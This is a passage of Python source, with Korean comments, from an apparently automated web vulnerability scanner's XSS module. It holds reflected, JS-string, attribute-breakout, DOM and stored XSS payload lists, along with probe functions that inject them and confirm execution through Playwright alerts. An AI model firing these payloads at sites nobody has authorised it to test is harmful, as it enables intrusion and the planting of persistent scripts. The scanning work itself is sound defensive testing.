    f"<a href=\"javascript:alert('{_XSS_CONFIRM_MSG}_'+document.domain)\">x</a>",
    # 닫는 태그 우회
    f"</title><script>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script>",
    f"</textarea><script>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script>",
    f"</style><script>alert('{_XSS_CONFIRM_MSG}_'+document.domain)</script>",
]

# 빠른 반사 확인용 (HTML 인코딩 없이 반사되는지 체크)
_XSS_QUICK_CHECK = re.compile(
    r'(<script>|<img[^>]+onerror|<svg[^>]+onload|<body[^>]+onload|onerror\s*=)',
    re.IGNORECASE,
)

# ── JS 컨텍스트(인라인 <script> 문자열/코드) 반사 XSS ─────────────────────────────
# HTML 컨텍스트가 아니라 인라인 스크립트의 문자열 리터럴 안으로 값이 반사되는 경우
# (예: <script> var x = '<여기 반사>'; </script>). 이때 <svg onload>·<script> 같은
# HTML 페이로드는 '문자열'로만 취급돼 실행되지 않는다 → 반드시 따옴표/스크립트 종료로
# JS 컨텍스트를 '탈출'해야 실행된다. (Root-Me web-client ch32 등 DOM/reflected JS-string XSS)
_XSS_JS_MARKER = _XSS_CONFIRM_MSG + "_JS"
_XSS_JS_PAYLOADS = [
    # (context, payload) — payload 는 값이 삽입될 따옴표를 닫고 alert 를 실행한다.
    ("squote",       f"';alert('{_XSS_JS_MARKER}_'+document.domain)//"),
    ("squote_sub",   f"'-alert('{_XSS_JS_MARKER}_'+document.domain)-'"),
    ("dquote",       f"\";alert('{_XSS_JS_MARKER}_'+document.domain)//"),
    ("backtick",     f"`;alert('{_XSS_JS_MARKER}_'+document.domain)//"),
    # 따옴표 필터와 공존하는 각괄호 허용 케이스: 따옴표 없이 regex 리터럴로 마커 전달.
    ("script_close", f"</script><script>alert(/{_XSS_JS_MARKER}/.source+document.domain)</script>"),
]

# <script ...>...</script> 블록 추출(JS 컨텍스트 판정용)
_SCRIPT_BLOCK_RE = re.compile(r"<script\b[^>]*>(.*?)</script>", re.IGNORECASE | re.DOTALL)


def _js_context_breakout(body: str, context: str) -> bool:
    """payload 가 인라인 스크립트에서 '탈출된 형태'로(따옴표 인코딩 없이) 반사됐는지 정적 확인.

    탈출 성공이면 마커 alert 가 문자열 밖 '코드'로 위치하므로 브라우저에서 실행된다.
    따옴표가 \\' 로 백슬래시 이스케이프되거나 &#39;/&quot; 로 엔티티 인코딩되면 탈출 실패(오탐 배제).
    """
    if not body:
        return False
    marker = _XSS_JS_MARKER
    if context == "script_close":
        # 스크립트 블록을 닫고 새 스크립트로 진입 — 각괄호/슬래시가 원문 반사되어야 실행.
        needle = f"</script><script>alert(/{marker}"
        return needle.lower() in body.lower()
    # 따옴표 탈출 계열: '닫는 따옴표 + 연산자 + alert(' + marker' 가 스크립트 블록 안에 원문으로 존재.
    raw_needle = {
        "squote":     f"';alert('{marker}",
        "squote_sub": f"'-alert('{marker}",
        "dquote":     f"\";alert('{marker}",
        "backtick":   f"`;alert('{marker}",
    }.get(context)
    if not raw_needle:
        return False
    for m in _SCRIPT_BLOCK_RE.finditer(body):
        blk = m.group(1)
        if raw_needle in blk:
            # 백슬래시 이스케이프( \\' ) 되어 있으면 탈출 실패로 간주
            if ("\\" + raw_needle) in blk:
                continue
            return True
    return False


async def _probe_xss_js_context(session, points: list[dict], scan_id: str = "") -> dict | None:
    """인라인 <script> JS 문자열/코드 컨텍스트로 반사되는 XSS.

    HTML 페이로드가 아니라 따옴표/스크립트 종료로 컨텍스트를 탈출하는 페이로드를 사용한다.
    정적 탈출 확인(따옴표 미인코딩) → Playwright 로 실제 alert 확인 시 CONFIRMED,
    Playwright 불가 시에도 원문 탈출 반사는 결정적으로 실행 가능하므로 confirmed 로 본다.
    """
    for pt in points[:12]:
        for param in list(pt["params"])[:6]:
            # 사전 게이트: 파라미터 값이 <script> 블록 '안'으로 반사되는지 벤치마크
            probe_token = f"{_XSS_CONFIRM_MSG}_CTX"
            tp0 = {**pt["params"], param: probe_token}
            if pt["method"] == "POST":
                _, body0, hdrs0 = await _post(session, pt["url"], data=tp0)
                base_verify = pt["url"]
            else:
                base_verify = _build_xss_url(pt, param, probe_token)
                _, body0, hdrs0 = await _get(session, base_verify)
            if not body0 or "text/html" not in hdrs0.get("Content-Type", ""):
                continue
            in_script = any(probe_token in m.group(1) for m in _SCRIPT_BLOCK_RE.finditer(body0))
            if not in_script:
                continue  # JS 컨텍스트 아님 → HTML 컨텍스트 probe 가 담당

            # JS 컨텍스트 확인됨 → 탈출 페이로드 시도
            for context, payload in _XSS_JS_PAYLOADS:
                tp = {**pt["params"], param: payload}
                if pt["method"] == "POST":
                    _, body, hdrs = await _post(session, pt["url"], data=tp)
                    verify_url = pt["url"]
                else:
                    verify_url = _build_xss_url(pt, param, payload)
                    _, body, hdrs = await _get(session, verify_url)
                if not body or "text/html" not in hdrs.get("Content-Type", ""):
                    continue
                if not _js_context_breakout(body, context):
                    continue

                # 정적 탈출 확인됨. 가능하면 Playwright 로 실제 실행까지 확인.
                pw_confirmed = False
                alert_msg = ""
                screenshots = []
                try:
                    pw_result = await _playwright_verify_xss(verify_url, scan_id=scan_id, base_url=pt["url"])
                    if pw_result and pw_result.get("confirmed"):
                        pw_confirmed = True
                        alert_msg = pw_result.get("alert_message", "")
                        screenshots = pw_result.get("evidence_screenshots", [])
                except Exception:
                    pass

                evidence = (
                    f"인라인 <script> JS {context} 컨텍스트로 값이 반사됨. 페이로드 "
                    f"'{payload}' 가 따옴표 인코딩 없이 원문 반사되어 문자열을 탈출 → "
                    f"alert('{_XSS_JS_MARKER}') 가 코드로 실행 가능."
                    + (f" Playwright 에서 alert('{alert_msg}') 실제 발생 확인." if pw_confirmed else
                       " (정적 탈출 확인 — HTML 페이로드로는 탐지되지 않는 JS-문자열 컨텍스트 XSS)")
                )
                return {
                    "type": "reflected_js_context",
                    "context": context,
                    "param": param,
                    "payload": payload,
                    "url": verify_url,
                    "method": pt["method"],
                    "confirmed": True,
                    "verification": "playwright" if pw_confirmed else "static_breakout",
                    "alert_message": alert_msg,
                    "evidence_screenshots": screenshots,
                    "evidence": evidence,
                }
    return None


# ── HTML 속성 컨텍스트(따옴표 속성값) 탈출 XSS ────────────────────────────────────
# 값이 <tag attr='<반사>'> 처럼 따옴표로 감싼 속성값 안으로 반사되는 경우. 태그(<,>)는
# 인코딩되어 새 태그 삽입은 막혀도, 구분 따옴표(' 또는 ")가 인코딩되지 않으면 속성값을
# 탈출해 '기존 태그'에 이벤트 핸들러 속성을 주입할 수 있다(autofocus+onfocus 로 자동 실행).
# (Root-Me web-client ch26: <a href='?p=<값>'> 에서 ' 만 미인코딩 → autofocus onfocus 주입)
_XSS_ATTR_MARKER = _XSS_CONFIRM_MSG + "_ATTR"
# 이벤트 트리거: onmousemove(자동화 봇이 마우스를 움직이면 발화 — autofocus 를 무시하는 봇에도
# 유효) + autofocus/onfocus(마우스 없는 헤드리스). 실제 exploit 는 onmousemove 가 광범위하게 통함
# (Root-Me ch26 봇 검증). 정적 탐지는 트리거와 무관하게 '따옴표 탈출' 여부만으로 판정한다.
_XSS_ATTR_PAYLOADS = [
    # (quote, payload). 탈출 후 고유 마커 속성(...ATTRb=1)을 심어 태그 내 주입을 정적 확인.
    ("'", f"x' {_XSS_ATTR_MARKER}b=1 autofocus onmousemove='alert(`{_XSS_ATTR_MARKER}`+document.domain)"),
    ('"', f'x" {_XSS_ATTR_MARKER}b=1 autofocus onmousemove="alert(`{_XSS_ATTR_MARKER}`+document.domain)'),
]


def _attr_breakout(body: str, quote: str) -> bool:
    """구분 따옴표가 미인코딩 반사되어 이벤트 핸들러 속성이 '태그 안'에 주입됐는지 정적 확인."""
    if not body:
        return False
    # 탈출 성공 시 원문 그대로: <... x' EOSEUREUM..._ATTRb=1 autofocus onmousemove=...
    raw = f"{quote} {_XSS_ATTR_MARKER}b=1 autofocus onmousemove="
    if raw not in body:
        # 따옴표가 &#39;/&quot; 로 엔티티 인코딩되면 raw 가 매칭되지 않음 → 미탐(오탐 배제)
        return False
    # raw 앞부분이 백슬래시로 이스케이프( \\' )된 경우 탈출 실패로 간주
    idx = body.find(raw)
    if idx > 0 and body[idx - 1] == "\\":
        return False
    return True


def _attr_breakout_exploitable(body: str, hdrs: dict) -> bool:
    """정적 속성 탈출이 '실제로 이벤트핸들러 실행이 가능한' 컨텍스트인지 판정(오탐 억제).
    - 반사가 <script>/<style>/<textarea>/<title> 의 열린 태그 안이거나 HTML 주석 안이면 주입한
      autofocus/onmousemove 이벤트핸들러가 실행되지 않음(예: <script src='x' onmousemove=..> 미발화) → False.
    - script-src CSP(unsafe-inline 없음)가 있으면 인라인 이벤트핸들러가 차단됨 → False.
    (브라우저 alert 로 실제 실행이 확인된 경우는 이 판정과 무관하게 확증한다.)"""
    idx = body.find(_XSS_ATTR_MARKER)
    if idx < 0:
        return False
    pre = body[:idx].lower()
    for tag in ("script", "style", "textarea", "title"):
        if pre.rfind("<" + tag) > pre.rfind("</" + tag):
            return False
    if pre.rfind("<!--") > pre.rfind("-->"):
        return False
    csp = ""
    for k, v in (hdrs or {}).items():
        if k.lower() == "content-security-policy":
            csp = v or ""
            break
    if csp and "script-src" in csp.lower() and "unsafe-inline" not in csp.lower():
        return False
    return True


async def _probe_xss_attr_context(session, points: list[dict], scan_id: str = "") -> dict | None:
    """따옴표 HTML 속성값 컨텍스트로 반사되어, 구분 따옴표 미인코딩 → 이벤트핸들러 주입 XSS.

    <,> 가 인코딩돼 새 태그를 못 넣는 상황에서도, ' 또는 " 가 raw 반사되면 기존 태그에
    autofocus+onfocus 를 주입해 자동 실행이 가능하다. 정적 탈출 확인 + (가능시)Playwright 확정.
    """
    gate_re = re.compile(r"<[a-zA-Z][^<>]*" + re.escape(_XSS_ATTR_MARKER + "GATE") + r"[^<>]*>")
    for pt in points[:12]:
        for param in list(pt["params"])[:6]:
            # 게이트: 값이 '태그의 속성 영역(< ... >)' 안으로 반사되는지 확인
            gate_token = _XSS_ATTR_MARKER + "GATE"
            tp0 = {**pt["params"], param: gate_token}
            if pt["method"] == "POST":
                _, body0, hdrs0 = await _post(session, pt["url"], data=tp0)
            else:
                _, body0, hdrs0 = await _get(session, _build_xss_url(pt, param, gate_token))
            if not body0 or "text/html" not in hdrs0.get("Content-Type", ""):
                continue
            if not gate_re.search(body0):
                continue  # 속성 컨텍스트 아님 → 다른 probe 담당

            for quote, payload in _XSS_ATTR_PAYLOADS:
                tp = {**pt["params"], param: payload}
                if pt["method"] == "POST":
                    _, body, hdrs = await _post(session, pt["url"], data=tp)
                    verify_url = pt["url"]
                else:
                    verify_url = _build_xss_url(pt, param, payload)
                    _, body, hdrs = await _get(session, verify_url)
                if not body or "text/html" not in hdrs.get("Content-Type", ""):
                    continue
                if not _attr_breakout(body, quote):
                    continue

                pw_confirmed, alert_msg, screenshots = False, "", []
                try:
                    # autofocus 발화를 돕기 위해 #q 프래그먼트를 붙여 실제 실행 확인
                    pw_result = await _playwright_verify_xss(verify_url + "#q", scan_id=scan_id, base_url=pt["url"])
                    if pw_result and pw_result.get("confirmed"):
                        pw_confirmed = True
                        alert_msg = pw_result.get("alert_message", "")
                        screenshots = pw_result.get("evidence_screenshots", [])
                except Exception:
                    pass

                # 정적 탈출만 있고 브라우저 실증이 없으면, '실행 가능한 컨텍스트'(script/style/주석 밖)
                # + CSP 미차단일 때만 확증한다. (예: DVWA csp 는 <script src='..'> 안으로 탈출 + CSP
                #  존재 → 이벤트핸들러 미실행이므로 오탐. 브라우저 alert 확인분은 위에서 이미 통과.)
                if not pw_confirmed and not _attr_breakout_exploitable(body, hdrs):
                    continue

                qname = "홑따옴표" if quote == "'" else "쌍따옴표"
                evidence = (
                    f"입력값이 HTML {qname} 속성값 안으로 반사되며, 구분 따옴표({quote})가 인코딩 없이 "
                    f"그대로 반사되어 속성값을 탈출→이벤트 핸들러(onmousemove/onfocus) 주입으로 실행 가능. "
                    + (f"브라우저에서 alert('{alert_msg}') 실제 발생 확인." if pw_confirmed else
                       "(구분 따옴표 미인코딩 정적 확인.)")
                )
                return {
                    "type": "reflected_attr_context",
                    "context": f"attr_{'squote' if quote == chr(39) else 'dquote'}",
                    "param": param,
                    "payload": payload,
                    "url": verify_url,
                    "method": pt["method"],
                    "confirmed": True,
                    "verification": "playwright" if pw_confirmed else "static_breakout",
                    "alert_message": alert_msg,
                    "evidence_screenshots": screenshots,
                    "evidence": evidence,
                }
    return None

# 클라이언트측 DOM XSS 탐지용 — 응답 JS 가 URL(location/search/hash) 을 읽어
# innerHTML/document.write 등으로 반영하면, 페이로드가 응답 본문에 '반사'되지 않아도
# 브라우저에서는 실행된다(예: /vuln?param=<img onerror> → innerHTML). 이 경우 반사 게이트를
# 우회하고 Playwright 로 실제 실행을 검증한다.
_URL_DOM_SOURCE = re.compile(
    r'(URLSearchParams|location\.search|location\.hash|location\.href|document\.location|'
    r'document\.URL|window\.name)', re.IGNORECASE)
_DOM_WRITE_SINK = re.compile(
    r'(\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|insertAdjacentHTML|\.innerHTML\s*\+=)',
    re.IGNORECASE)
# <script> 를 실행시킬 수 있는 싱크(innerHTML 은 <script> 미실행 → 이벤트핸들러 페이로드 필요)
_SCRIPT_EXEC_SINK = re.compile(
    r'(document\.write\s*\(|eval\s*\(|setTimeout\s*\(|setInterval\s*\(|\.src\s*=|new\s+Function)',
    re.IGNORECASE)


def _build_xss_url(pt: dict, param: str, payload: str) -> str:
    encoded = urllib.parse.quote(payload, safe="")
    base = pt["url"]
    other_params = {k: v for k, v in pt["params"].items() if k != param}
    qs = "&".join([f"{k}={urllib.parse.quote(str(v))}" for k, v in other_params.items()])
    qs = f"{qs}&{param}={encoded}" if qs else f"{param}={encoded}"
    return f"{base}?{qs}"


_XSS_REFLECTIVE_PARAM_RE = re.compile(
    r"(name|search|q|query|keyword|kw|term|msg|message|comment|text|txt|input|title|"
    r"content|body|feedback|default|return|subject|desc|note|value|data|word|find)",
    re.I)


# 로그인/인증 폼 파라미터 — 이런 폼은 전용 프로브(login_sqli 등)가 담당하며 '대표 취약 페이지'가
# 아니므로 XSS/주입 대표 우선순위에서 뒤로 보낸다(예: DVWA brute 의 username 이 'name' 매칭으로
# 반사형처럼 앞서 확증→대표로 보고되어 정작 xss_r 가 안 잡히던 문제 교정).
_AUTH_FORM_PARAM_RE = re.compile(r'^(?:username|user|password|passwd|pass|login|user_token|csrf(?:_?token)?|email)$', re.I)


def _is_auth_form_point(pt: dict) -> bool:
    params = [str(k) for k in (pt.get("params") or {}).keys()]
    has_pw = any(str(k).lower() in ("password", "passwd", "pass", "user_token") for k in params)
    has_authish = any(_AUTH_FORM_PARAM_RE.match(k) for k in params)
    return bool(has_pw and has_authish)


def _xss_point_priority(pt: dict) -> tuple:
    """XSS 우선순위: 반사되기 쉬운 지점(GET 폼·반사형 파라미터명)을 앞으로, 로그인 폼은 뒤로.
    (기존엔 공격표면 점수 정렬로 SQLi/LFI 파라미터가 앞을 차지해 name 등 XSS 파라미터가
    points[:12] 밖으로 밀려 반사형 XSS 가 아예 미점검됐음 — DVWA xss_r 미검출의 근본원인.)"""
    is_auth = _is_auth_form_point(pt)
    reflective = any(_XSS_REFLECTIVE_PARAM_RE.search(str(k)) for k in (pt.get("params") or {})) and not is_auth
    is_get = pt.get("method", "GET") == "GET"
    # 정렬 키(오름차순): 반사형(비로그인) 우선(0) → GET 우선(0) → 로그인 폼은 최후(1)
    return (0 if reflective else 1, 0 if is_get else 1, 1 if is_auth else 0)


async def _probe_xss_reflected(session, points: list[dict], scan_id: str = "") -> dict | None:
    """
    반사형 XSS: alert() 페이로드 주입 → Playwright에서 실제 alert 발생 시에만 취약점으로 확인.
    반사만 되고 alert가 발생하지 않으면 None 반환 (미확인).
    """
    # 반사형 XSS 는 반사되기 쉬운 지점(GET 폼·반사형 파라미터)을 우선 점검한다. 캡도 상향
    # (기존 12 → 점검예산 기반): 저렴한 HTTP 반사확인 후 '실제 반사된' 지점만 Playwright 확증하므로
    # 캡을 올려도 비용은 반사가 실제 일어난 소수 지점에만 든다.
    import validation_profiles as _vp
    try:
        _xcap = 80 if _vp.proof_active() else 30
    except Exception:
        _xcap = 30
    points = sorted(points, key=_xss_point_priority)[:_xcap]
    # 첫 확증에서 멈추지 않고 '확증된 모든 지점'을 수집한다(기존엔 첫 확증에서 return → 여러 취약
    # 페이지가 있어도 1건만·순서상 로그인폼이 먼저 걸리면 대표가 엉뚱해짐 — DVWA xss_r/s/d 중 일부만).
    # 대표(우선순위 1위)를 primary 로, 나머지는 additional_confirmations 로 남겨 전부 표면화한다.
    _confirmed: list[dict] = []
    _seen_cf: set = set()
    try:
        _max_cf = 12 if _vp.proof_active() else 6   # 수집 상한(Playwright 비용 방어)
    except Exception:
        _max_cf = 6
    for pt in points:
        if len(_confirmed) >= _max_cf:
            break
        _pt_done = False
        for param in list(pt["params"])[:6]:
            if _pt_done:
                break
            for payload in _XSS_PAYLOADS[:6]:
                tp = {**pt["params"], param: payload}
                if pt["method"] == "POST":
                    _, body, hdrs = await _post(session, pt["url"], data=tp)
                    verify_url = pt["url"]
                else:
                    verify_url = _build_xss_url(pt, param, payload)
                    _, body, hdrs = await _get(session, verify_url)

                ct = hdrs.get("Content-Type", "")
                if not body or "text/html" not in ct:
                    continue

                # 반사 여부 + 클라이언트측 DOM 싱크 여부 판정
                reflected = payload[:10] in body or _XSS_CONFIRM_MSG in body
                dom_based = bool(_URL_DOM_SOURCE.search(body) and _DOM_WRITE_SINK.search(body))

                if not reflected and not dom_based:
                    continue
                # 반사됐는데 인코딩되어 있으면 오탐 방지로 스킵(단, DOM 싱크면 브라우저 실행 가능성 있어 진행)
                if reflected and not dom_based and ("&lt;script&gt;" in body or "&#60;script&#62;" in body):
                    continue
                # innerHTML 계열만 있는 DOM 싱크에서는 <script> 페이로드가 실행 안 됨 →
                # 이벤트핸들러(onerror/onload) 페이로드만 브라우저 검증(불필요한 Playwright 실행 절감)
                if dom_based and not reflected:
                    _is_event = ("onerror" in payload.lower() or "onload" in payload.lower())
                    if not _is_event and not _SCRIPT_EXEC_SINK.search(body):
                        continue

                # Playwright 네비게이션 대상 URL 결정.
                # ★DOM XSS: 페이로드를 퍼센트 인코딩하면 대상 JS 의 decodeURI 가 %3C 를 복원하지
                #  못해 실행이 안 된다(DVWA xss_d 실측). DOM 싱크 경로에선 '원문(raw) 페이로드'로
                #  네비게이션해야 document.write 로 실제 실행된다. 반사형은 기존 인코딩 URL 유지.
                _pw_url = verify_url
                if dom_based and not reflected and pt.get("method", "GET") == "GET":
                    _others = "&".join(f"{k}={v}" for k, v in pt["params"].items() if k != param)
                    _raw_qs = (f"{_others}&" if _others else "") + f"{param}={payload}"
                    _pw_url = f"{pt['url']}?{_raw_qs}"
                # Playwright로 실제 alert 발생 확인 — 발생하지 않으면 건너뜀
                pw_result = await _playwright_verify_xss(_pw_url, scan_id=scan_id, base_url=pt["url"])
                if not (pw_result and pw_result.get("confirmed")):
                    continue
                verify_url = _pw_url

                _xss_kind = "dom" if (dom_based and not reflected) else "reflected"
                alert_msg = pw_result.get("alert_message", "")
                screenshots = pw_result.get("evidence_screenshots", [])
                # 폴백: alert 다이얼로그로 프로브 스샷이 비면(저장형과 동일 원인), 다이얼로그-안전 캡처로
                # '정상 페이지 → 페이로드 주입 후 실행'을 확실히 촬영(사용자 지적: 스샷 1장뿐이라 실증 확인 불가).
                if not screenshots and scan_id:
                    try:
                        _klabel = "DOM 기반" if _xss_kind == "dom" else "반사형"
                        screenshots = await _capture_step_shots(scan_id, [
                            (pt["url"],
                             f"【1단계】 점검 대상 페이지 (공격 이전 정상)\nURL: {pt['url'][:100]}\n"
                             f"파라미터 '{param}' 식별",
                             "#1E3A5F", "left"),
                            (verify_url,
                             f"【2단계】 ★ {_klabel} XSS 페이로드 주입 → 브라우저에서 alert('{alert_msg}') 실제 발생\n"
                             f"파라미터: {param}\n페이로드: {payload[:90]}",
                             "#DC2626", "bottom"),
                        ], f"xss_{_xss_kind}_{param[:8]}")
                    except Exception:
                        pass
                # DevTools Network 탭 스타일 스크린샷 (요청/응답 헤더 + 응답 바디)
                dt_shot = await _capture_devtools_network_shot(
                    scan_id=scan_id,
                    label=f"xss_{param[:8]}",
                    target_url=verify_url,
                    highlight_texts=[payload[:60], _XSS_CONFIRM_MSG],
                    vuln_title=f"{'DOM 기반' if _xss_kind=='dom' else '반사형'} XSS — {param} 파라미터, alert('{alert_msg}') 발생",
                )
                if dt_shot:
                    screenshots.append(dt_shot)
                _finding = {
                    "type": _xss_kind,
                    "param": param,
                    "payload": payload,
                    "url": verify_url,
                    "method": pt["method"],
                    "confirmed": True,
                    "alert_message": alert_msg,
                    "evidence_screenshots": screenshots,
                    "evidence": (f"Playwright 브라우저에서 alert('{alert_msg}') 실제 발생 확인됨"
                                 + (" (클라이언트측 DOM 싱크 — 응답 반사 없이 브라우저 실행)"
                                    if _xss_kind == "dom" else "")),
                }
                _cf_key = (pt.get("url", ""), param)
                if _cf_key not in _seen_cf:
                    _seen_cf.add(_cf_key)
                    _confirmed.append(_finding)
                _pt_done = True   # 이 지점은 확증됨 → 다음 지점으로(같은 지점 추가 페이로드 생략)
                break
    if not _confirmed:
        return None
    # 유형 분리: '반사형'과 'DOM 기반'은 취약 위치·원인이 달라(서버 반사 vs 클라 JS) 각각 별도
    # finding 으로 표면화한다(사용자 요구: DOM 이 반사형에 흡수돼 안 보이던 문제 교정).
    _refl = [f for f in _confirmed if f.get("type") != "dom"]
    _dom = [f for f in _confirmed if f.get("type") == "dom"]

    def _with_extra(prim, group):
        rest = [f for f in group if f is not prim]
        if rest:
            prim["additional_confirmations"] = [
                {"type": f.get("type"), "param": f.get("param"),
                 "url": f.get("url"), "evidence": f.get("evidence")} for f in rest]
            prim["confirmed_count"] = len(group)
        return prim

    if _refl:
        primary = _with_extra(_refl[0], _refl)
        if _dom:   # 반사형+DOM 동시 확증 → DOM 은 caller 가 findings["dom_xss"] 로 분리 등록
            primary["_dom_finding"] = _with_extra(_dom[0], _dom)
        return primary
    # 반사형 없이 DOM 만 확증 → 기존대로 primary=dom(xss_reflected 키+type=dom → 'DOM 기반' 제목)
    return _with_extra(_dom[0] if _dom else _confirmed[0], _dom or _confirmed)


# ── XS: 저장형 XSS ──────────────────────────────────────────────────────────────

async def _probe_xss_stored(session, base_url: str, points: list[dict], scan_id: str = "",
                            discovered_urls: list[str] | None = None) -> dict | None:
    """
    저장형 XSS: POST 폼에 페이로드 제출 → Playwright에서 실제 alert 발생 시에만 취약점 확인.
    기본 비활성(ENABLE_STORED_XSS=false) — 저장성 점검은 명시 활성 시에만 수행(비파괴/마커 기반).

    저장형은 '주입 페이지'와 '표면화 페이지'가 다른 경우가 많다. 그래서
    제출URL·base 외에 발견된 URL 표본도 검증 대상에 포함하고, 주입한 고유 마커를
    레지스트리에 등록해 이후 반복 재크롤이 새 페이지에서 재확인할 수 있게 한다.
    """
    try:
        import probe_policy
        if not probe_policy.stored_xss_enabled():
            return None
    except Exception:
        return None
    # 스캔별 고유 저장 마커(페이지 tying·재확인용). alert 문자열엔 _XSS_CONFIRM_MSG 를 유지해
    # 기존 Playwright 확정 계약(마커 포함 alert)을 보존한다.
    _uniq = (scan_id or "X").replace("-", "")[:10] or "X"
    stored_marker = f"{_XSS_CONFIRM_MSG}_STORED_{_uniq}"
    stored_payload = f"<script>alert('{stored_marker}')</script>"

    # 저장형 대상: base 페이지 서버 렌더 폼(source="form")뿐 아니라 브라우저 발견 폼
    # (source="browser_discovery")과 params 를 가진 POST 입력점도 포함 → SPA/딥페이지 폼도 커버.
    # (예전엔 source=="form" 만 허용해 브라우저 발견/딥페이지 폼이 구조적으로 제외됐다.)
    _stored_targets = [
        p for p in points
        if p.get("method") == "POST"
        and (p.get("source") in _FORM_SOURCES)
        and (p.get("params"))
    ]
    for pt in _stored_targets[:8]:
        inject_params = {**pt["params"]}
        target_param = None

        for param, val in pt["params"].items():
            if not re.search(r'(csrf|token|nonce|_token)', param, re.IGNORECASE):
                inject_params[param] = stored_payload
                target_param = param
                break

        if not target_param:
            continue

        post_status, _, _ = await _post(session, pt["url"], data=inject_params)
        if post_status not in (200, 201, 302):
            continue

        # 주입 등록(재크롤 재확인용)
        register_stored_xss_injection(scan_id, stored_marker, pt["url"], target_param, base_url)

        # 검증 대상: 제출URL·base 는 항상 Playwright 확정 시도. 발견 URL 표본은 먼저
        # 원문 마커(raw)로 싸게 스캔해 마커가 있는 페이지만 Playwright 로 확정(브라우저 호출 최소화).
        check_urls = [pt["url"], base_url]
        for _du in (discovered_urls or [])[:40]:
            if _du and _du not in check_urls:
                check_urls.append(_du)
        for check_url in check_urls:
            if check_url not in (pt["url"], base_url):
                try:
                    _st, _body, _ = await _get(session, check_url)
                except Exception:
                    continue
                if not stored_marker_in_body(_body, stored_marker):
                    continue
            pw_result = await _playwright_verify_xss(check_url, scan_id=scan_id, timeout_ms=6000, base_url=base_url)
            if pw_result and pw_result.get("confirmed"):
                alert_msg = pw_result.get("alert_message", "")
                screenshots = pw_result.get("evidence_screenshots", [])
                # 폴백: alert 다이얼로그로 프로브 스샷이 비면, 다이얼로그-안전 캡처로 '어느 페이지에
                # 스크립트가 저장되어 실행되는지'를 확실히 촬영(사용자 지적: 저장 위치가 안 보임).
                if not screenshots and scan_id:
                    try:
                        screenshots = await _capture_step_shots(scan_id, [
                            (pt["url"],
                             f"【1단계】 저장형 XSS 대상 폼 (인증 영역)\nURL: {pt['url']}\n"
                             f"파라미터 '{target_param}' 에 스크립트 저장",
                             "#1E3A5F", "left"),
                            (check_url,
                             "【2단계】 ★ 저장된 스크립트가 이 페이지에 반영됨 → 방문 시 실행\n"
                             f"URL: {check_url}\n"
                             f"저장 페이로드: {stored_payload}\n"
                             f"브라우저에서 alert('{alert_msg}') 실제 발생 확인",
                             "#DC2626", "bottom"),
                        ], f"sxss_{(target_param or 'p')[:8]}")
                    except Exception:
                        pass
                cleanup_marker = f"Eoseureum_vulntest_{scan_id}_{_XSS_CONFIRM_MSG}" if scan_id else _XSS_CONFIRM_MSG
                return {
                    "type": "stored",
                    "param": target_param,
                    "payload": stored_payload,
                    "submit_url": pt["url"],
                    "verify_url": check_url,
                    "method": "POST",
                    "confirmed": True,
                    "alert_message": alert_msg,
                    "evidence_screenshots": screenshots,
                    "evidence": (f"저장형 XSS: '{pt['url']}' 폼 제출 후 "
                                 + (f"'{check_url}' 페이지에서 " if check_url != pt["url"] else "")
                                 + f"alert('{alert_msg}') 실제 발생"),
                    "stored_marker": stored_marker,
                    "cleanup_marker": cleanup_marker,
                    "cleanup_attempted": False,
                    "cleanup_success": False,
                    "affected_endpoints": [pt["url"], check_url],
                }
    return None


async def recheck_stored_xss(scan_id: str, urls: list, base_url: str = "") -> list:
    """반복 재크롤이 새로 찾은 페이지에서, 1차에 주입한 저장형 XSS 마커의 반영·실행을 재확인한다.

    새 데이터 주입은 하지 않는다(읽기 전용 재확인). 확정된 저장형 XSS finding dict 리스트 반환.
    """
    injections = get_stored_xss_injections(scan_id)
    if not injections or not urls:
        return []
    try:
        import probe_policy
        if not probe_policy.stored_xss_enabled():
            return []
    except Exception:
        return []
    out: list = []
    connector = _ssl_connector()
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            for url in list(urls)[:40]:
                try:
                    _st, body, _ = await _get(session, url)
                except Exception:
                    continue
                if not body:
                    continue
                for inj in injections:
                    if not stored_marker_in_body(body, inj["marker"]):
                        continue
                    pw = await _playwright_verify_xss(
                        url, scan_id=scan_id, timeout_ms=6000,
                        base_url=base_url or inj.get("base_url", ""))
                    if pw and pw.get("confirmed"):
                        out.append({
                            "host": "", "port": 0, "service": "http",
                            "judgment": "취약", "severity": "HIGH", "confidence": "CONFIRMED_BROWSER",
                            "force_finding_type": "vulnerability",
                            "owasp": "A03:2021 - 인젝션", "cwe": "CWE-79",
                            "title": "저장형 XSS(Stored XSS) — 재크롤 심층 페이지에서 실행 실증",
                            "description": (f"1차 점검에서 '{inj['submit_url']}' 폼(파라미터 "
                                            f"'{inj['param']}')에 주입한 저장형 XSS 마커가 "
                                            f"재크롤로 발견한 '{url}' 페이지에서 실제로 실행되었습니다."),
                            "evidence_url": url,
                            "evidence_detail": (f"submit={inj['submit_url']} · surface={url} · "
                                                f"alert={pw.get('alert_message','')}"),
                            "evidence_screenshots": pw.get("evidence_screenshots", []),
                            "recommendation": ("사용자 입력 저장·출력 지점에 컨텍스트 기반 출력 인코딩과 "
                                               "서버측 검증을 적용하고, CSP 를 함께 적용하십시오."),
                            "discovered_by": "recheck_stored_xss",
                        })
                    break  # 한 페이지에서 마커 1건 확인이면 충분
    except Exception:
        pass
    return out


# ── XS: DOM 기반 XSS (정적 분석) ─────────────────────────────────────────────────

_DOM_XSS_SINKS = re.compile(
    r'(document\.write\s*\(|\.innerHTML\s*=|\.outerHTML\s*=|'
    r'eval\s*\(|setTimeout\s*\(["\']|setInterval\s*\(["\']|'
    r'location\s*=\s*(?:location\.)?(?:hash|search)|'
    r'document\.location\s*=|window\.location\s*=|'
    r'insertAdjacentHTML\s*\()',
    re.IGNORECASE,
)
_DOM_XSS_SOURCES = re.compile(
    r'(location\.hash|location\.search|location\.href|'
    r'document\.URL|document\.referrer|window\.name|'
    r'decodeURIComponent\s*\(location)',
    re.IGNORECASE,
)


async def _probe_dom_xss(session, base_url: str, scan_id: str = "",
                         discovered_urls: list | None = None) -> dict | None:
    """DOM XSS: hash(#) 프래그먼트 기반 페이로드로 실제 alert 발생 시에만 확인(ENABLE_DOM_XSS, 기본 on).

    프래그먼트(#뒤)는 서버로 전송되지 않으므로, 그걸로 실행되면 100% 클라이언트측(DOM) 취약점이다.
